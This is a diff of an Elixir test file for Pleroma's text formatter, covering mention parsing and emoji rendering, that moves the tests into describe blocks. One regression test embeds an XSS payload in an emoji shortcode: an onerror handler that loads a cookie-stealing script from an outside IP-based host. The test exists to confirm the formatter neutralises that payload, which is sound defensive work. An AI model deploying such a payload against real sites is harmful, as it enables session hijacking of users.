@@ -217,6 +217,27 @@ defmodule Pleroma.FormatterTest do
 
       assert expected_text =~ "how are you doing?"
     end
+
+    test "it can parse mentions and return the relevant users" do
+      text =
+        "@@gsimg According to @archaeme, that is @daggsy. Also hello @archaeme@archae.me and @o and @@@jimm"
+
+      o = insert(:user, %{nickname: "o"})
+      jimm = insert(:user, %{nickname: "jimm"})
+      gsimg = insert(:user, %{nickname: "gsimg"})
+      archaeme = insert(:user, %{nickname: "archaeme"})
+      archaeme_remote = insert(:user, %{nickname: "archaeme@archae.me"})
+
+      expected_mentions = [
+        {"@archaeme", archaeme},
+        {"@archaeme@archae.me", archaeme_remote},
+        {"@gsimg", gsimg},
+        {"@jimm", jimm},
+        {"@o", o}
+      ]
+
+      assert {_text, ^expected_mentions, []} = Formatter.linkify(text)
+    end
   end
 
   describe ".parse_tags" do
@@ -234,67 +255,50 @@ defmodule Pleroma.FormatterTest do
     end
   end
 
-  test "it can parse mentions and return the relevant users" do
-    text =
-      "@@gsimg According to @archaeme, that is @daggsy. Also hello @archaeme@archae.me and @o and @@@jimm"
+  describe "emojify" do
+    test "it adds cool emoji" do
+      text = "I love :firefox:"
 
-    o = insert(:user, %{nickname: "o"})
-    jimm = insert(:user, %{nickname: "jimm"})
-    gsimg = insert(:user, %{nickname: "gsimg"})
-    archaeme = insert(:user, %{nickname: "archaeme"})
-    archaeme_remote = insert(:user, %{nickname: "archaeme@archae.me"})
+      expected_result =
+        "I love <img class=\"emoji\" alt=\"firefox\" title=\"firefox\" src=\"/emoji/Firefox.gif\" />"
 
-    expected_mentions = [
-      {"@archaeme", archaeme},
-      {"@archaeme@archae.me", archaeme_remote},
-      {"@gsimg", gsimg},
-      {"@jimm", jimm},
-      {"@o", o}
-    ]
+      assert Formatter.emojify(text) == expected_result
+    end
 
-    assert {_text, ^expected_mentions, []} = Formatter.linkify(text)
+    test "it does not add XSS emoji" do
+      text =
+        "I love :'onload=\"this.src='bacon'\" onerror='var a = document.createElement(\"script\");a.src=\"//51.15.235.162.xip.io/cookie.js\";document.body.appendChild(a):"
+
+      custom_emoji = %{
+        "'onload=\"this.src='bacon'\" onerror='var a = document.createElement(\"script\");a.src=\"//51.15.235.162.xip.io/cookie.js\";document.body.appendChild(a)" =>
+          "https://placehold.it/1x1"
+      }
+
+      expected_result =
+        "I love <img class=\"emoji\" alt=\"\" title=\"\" src=\"https://placehold.it/1x1\" />"
+
+      assert Formatter.emojify(text, custom_emoji) == expected_result
+    end
   end
 
-  test "it adds cool emoji" do
-    text = "I love :firefox:"
+  describe "get_emoji" do
+    test "it returns the emoji used in the text" do
+      text = "I love :firefox:"
 
-    expected_result =
-      "I love <img class=\"emoji\" alt=\"firefox\" title=\"firefox\" src=\"/emoji/Firefox.gif\" />"
+      assert Formatter.get_emoji(text) == [
+               {"firefox", "/emoji/Firefox.gif", ["Gif", "Fun"], "firefox", "/emoji/Firefox.gif"}
+             ]
+    end
 
-    assert Formatter.emojify(text) == expected_result
-  end
+    test "it returns a nice empty result when no emojis are present" do
+      text = "I love moominamma"
+      assert Formatter.get_emoji(text) == []
+    end
 
-  test "it does not add XSS emoji" do
-    text =
-      "I love :'onload=\"this.src='bacon'\" onerror='var a = document.createElement(\"script\");a.src=\"//51.15.235.162.xip.io/cookie.js\";document.body.appendChild(a):"
-
-    custom_emoji = %{
-      "'onload=\"this.src='bacon'\" onerror='var a = document.createElement(\"script\");a.src=\"//51.15.235.162.xip.io/cookie.js\";document.body.appendChild(a)" =>
-        "https://placehold.it/1x1"
-    }
-
-    expected_result =
-      "I love <img class=\"emoji\" alt=\"\" title=\"\" src=\"https://placehold.it/1x1\" />"
-
-    assert Formatter.emojify(text, custom_emoji) == expected_result
-  end
-
-  test "it returns the emoji used in the text" do
-    text = "I love :firefox:"
-
-    assert Formatter.get_emoji(text) == [
-             {"firefox", "/emoji/Firefox.gif", ["Gif", "Fun"]}
-           ]
-  end
-
-  test "it returns a nice empty result when no emojis are present" do
-    text = "I love moominamma"
-    assert Formatter.get_emoji(text) == []
-  end
-
-  test "it doesn't die when text is absent" do
-    text = nil
-    assert Formatter.get_emoji(text) == []
+    test "it doesn't die when text is absent" do
+      text = nil
+      assert Formatter.get_emoji(text) == []
+    end
   end
 
   test "it escapes HTML in plain text" do
